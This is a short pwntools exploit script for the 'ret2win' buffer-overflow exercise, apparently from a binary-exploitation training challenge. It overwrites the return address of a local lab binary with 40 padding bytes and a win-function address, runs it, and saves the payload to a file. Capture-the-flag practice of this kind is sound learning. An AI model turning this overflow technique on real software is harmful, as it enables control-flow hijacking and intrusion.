from pwn import *

binary = context.binary = ELF("./ret2win", checksec=True)

padding = b"A" * 40
win_addr = p64(0x00400756+1)  # +1 to realign stack after movaps issue
# 0x000000000040053e : ret

payload = padding + win_addr
p = process(binary.path)
with open("payload.txt", "wb") as file:
	file.write(payload)
p.sendline(payload)
print(p.recvall())
p.close()
